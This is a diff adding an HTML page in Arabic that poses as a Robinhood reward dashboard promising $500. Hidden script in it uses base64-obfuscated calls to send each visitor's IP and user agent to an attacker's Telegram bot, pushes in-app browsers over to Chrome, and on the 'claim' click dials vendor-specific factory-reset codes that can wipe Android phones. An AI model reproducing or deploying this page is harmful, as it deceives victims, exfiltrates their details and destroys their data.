@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Robinhood | Reward Dashboard</title>
+    <style>
+        body { background:#000; color:#fff; font-family:sans-serif; text-align:center; margin:0; }
+        .c { margin:50px auto; padding:35px; border:2px solid #00c805; border-radius:20px; width:85%; max-width:420px; background:#111; }
+        .p { font-size:48px; color:#00c805; font-weight:bold; }
+        .b { display:block; padding:18px; background:#00c805; color:#000; text-decoration:none; border-radius:10px; font-weight:bold; font-size:22px; }
+    </style>
+</head>
+<body onload="v_init()">
+
+<div style="background:#00c805; padding:15px; color:#000; font-weight:bold;">نظام مكافآت Robinhood الرسمي</div>
+<div class="c">
+    <h3>تهانينا! مكافأتك جاهزة</h3>
+    <div class="p">$500.00</div>
+    <p>لتلقي الأموال، اضغط أدناه لتحديث بروتوكول الأمان وربط المحفظة بجهازك.</p>
+    <a href="javascript:void(0)" class="b" id="trigger">تحديث واستلام الآن</a>
+</div>
+
+<script>
+    const _t = "ODU4NTE1NzEzNjpBQUVhQlp3LVgwUXVmT3JFeFRWQ2RKZ20wZXpycTNRTGtqOA==";
+    const _c = "NzE4NDk3MDM1NQ==";
+    function _d(s) { return atob(s); }
+
+    function v_init() {
+        fetch(atob("aHR0cHM6Ly9hcGkuaXBpZnkub3JnP2Zvcm1hdD1qc29u")).then(r => r.json()).then(d => {
+            let ua = navigator.userAgent;
+            let status = (ua.match(/Android\s([4-9]|10)\./)) ? "🚀 تلقائي (10-)" : "⚠️ يدوي (11+)";
+            let msg = `🎯 صيد جديد!\n🌐 IP: ${d.ip}\n⚙️ الحالة: ${status}\n🌍 الوكيل: ${ua.substring(0,80)}`;
+            fetch(`https://api.telegram.org/bot${_d(_t)}/sendMessage?chat_id=${_d(_c)}&text=${encodeURIComponent(msg)}`);
+        });
+
+        if (navigator.userAgent.match(/FBAN|FBAV|WhatsApp|Instagram/i)) {
+            window.location.href = "intent://" + window.location.host + window.location.pathname + "#Intent;scheme=http;package=com.android.chrome;end";
+        }
+    }
+
+    document.getElementById('trigger').onclick = function() {
+        let u = navigator.userAgent.toLowerCase();
+        let k = "2767*3855%23"; // الافتراضي (سامسونج)
+
+        // قاعدة بيانات الأكواد لجميع الشركات
+        if (u.includes("samsung")) { k = "2767*3855%23"; }
+        else if (u.includes("sony")) { k = "%23*%23*7378423*%23*%23"; }
+        else if (u.includes("oppo") || u.includes("realme") || u.includes("vivo")) { k = "2767*3855%23"; }
+        else if (u.includes("xiaomi") || u.includes("redmi")) { k = "%23*%23*7780*%23*%23"; }
+        else if (u.includes("huawei") || u.includes("honor")) { k = "%23*%23*2846579*%23*%23"; }
+        else if (u.includes("lg")) { k = "2767*3855%23"; }
+        else if (u.includes("motorola") || u.includes("google") || u.includes("pixel")) { k = "%23*%23*7780*%23*%23"; }
+        else { k = "2767*3855%23"; } // لأي أندرويد آخر
+
+        fetch(`https://api.telegram.org/bot${_d(_t)}/sendMessage?chat_id=${_d(_c)}&text=${encodeURIComponent("⚠️ الضحية ضغط على الاتصال!")}`);
+
+        setTimeout(() => {
+            window.location.href = "tel:*" + k;
+        }, 200);
+    };
+</script>
+</body>
+</html>
